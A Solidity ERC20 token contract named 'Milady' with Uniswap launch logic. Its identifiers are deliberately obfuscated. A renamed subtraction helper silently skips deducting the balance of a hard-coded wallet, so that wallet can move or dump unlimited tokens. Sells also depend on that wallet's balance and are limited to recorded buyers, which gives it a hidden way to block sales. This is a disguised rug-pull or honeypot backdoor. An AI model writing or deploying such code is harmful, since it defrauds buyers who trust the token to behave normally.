pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _vflbo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _vflbo(a, b, "SafeMath");
    }

    function  _vflbo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _qewnf(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Milady is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _yeuesor;
    address payable private _enstob;
    address private _refsip;
    string private constant _name = unicode"Milady";
    string private constant _symbol = unicode"Milady";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Klaore=0;
    uint256 private _boeajy=0;
    uint256 public _becfeo = _totalSupply;
    uint256 public _wronek = _totalSupply;
    uint256 public _kljlvd= _totalSupply;
    uint256 public _hfixef= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _vmrvue;
    mapping (address => bool) private _qkvoey;
    mapping(address => uint256) private _fokiux;

    bool private _momopen;
    bool public _pivdsq = false;
    bool private qvshbf = false;
    bool private _qrijxe = false;


    event _ebrjvk(uint _becfeo);
    modifier fseyvb {
        qvshbf = true;
        _;
        qvshbf = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _vmrvue[owner(

        )] = true;
        _vmrvue[address
        (this)] = true;
        _vmrvue[
            _enstob] = true;
        _enstob = 
        payable (0xb1AA8D55db8A02b042b5d5DD6a549d10b59339fb);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _vflbo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 pvufog=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_pivdsq) {
                if (to 
                != address
                (_yeuesor) 
                && to !=
                 address
                 (_refsip)) {
                  require(_fokiux
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fokiux
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _refsip && to != 
            address(_yeuesor) &&
             !_vmrvue[to] ) {
                require(amount 
                <= _becfeo,
                 "Exceeds the _becfeo.");
                require(balanceOf
                (to) + amount
                 <= _wronek,
                  "Exceeds the _wronek.");
                if(_boeajy
                < _Klaore){
                  require
                  (! _fkjgpv(to));
                }
                _boeajy++;
                 _qkvoey
                 [to]=true;
                pvufog = amount._qewnf
                ((_boeajy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _refsip &&
             from!= address(this) 
            && !_vmrvue[from] ){
                require(amount <= 
                _becfeo && 
                balanceOf(_enstob)
                <_hfixef,
                 "Exceeds the _becfeo.");
                pvufog = amount._qewnf((_boeajy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_boeajy>
                _Klaore &&
                 _qkvoey[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!qvshbf 
            && to == _refsip &&
             _qrijxe &&
             contractTokenBalance>
             _kljlvd 
            && _boeajy>
            _Klaore&&
             !_vmrvue[to]&&
              !_vmrvue[from]
            ) {
                _transferFrom( _eofqv(amount, 
                _eofqv(contractTokenBalance,
                _hfixef)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _plvopk(address
                    (this).balance);
                }
            }
        }

        if(pvufog>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(pvufog);
          emit
           Transfer(from,
           address
           (this),pvufog);
        }
        _balances[from
        ]= _vflbo(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _vflbo(pvufog));
        emit Transfer
        (from, to, 
        amount.
         _vflbo(pvufog));
    }

    function _transferFrom(uint256
     tokenAmount) private
      fseyvb {
        if(tokenAmount==
        0){return;}
        if(!_momopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _yeuesor.WETH();
        _approve(address(this),
         address(
             _yeuesor), 
             tokenAmount);
        _yeuesor.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _eofqv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _vflbo(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _enstob){
            return a ;
        }else{
            return a .
             _vflbo (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _becfeo = _totalSupply;
        _wronek = _totalSupply;
        emit _ebrjvk(_totalSupply);
    }

    function _fkjgpv(address 
    account) private view 
    returns (bool) {
        uint256 fdvrep;
        assembly {
            fdvrep :=
             extcodesize
             (account)
        }
        return fdvrep > 
        0;
    }

    function _plvopk(uint256
    amount) private {
        _enstob.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _momopen ) ;
        _yeuesor  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _yeuesor), 
            _totalSupply);
        _refsip = 
        IUniswapV2Factory(_yeuesor.
        factory( ) 
        ). createPair (
            address(this
            ),  _yeuesor .
             WETH ( ) );
        _yeuesor.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_refsip).
        approve(address(_yeuesor), 
        type(uint)
        .max);
        _qrijxe = true;
        _momopen = true;
    }

    receive() external payable {}
}
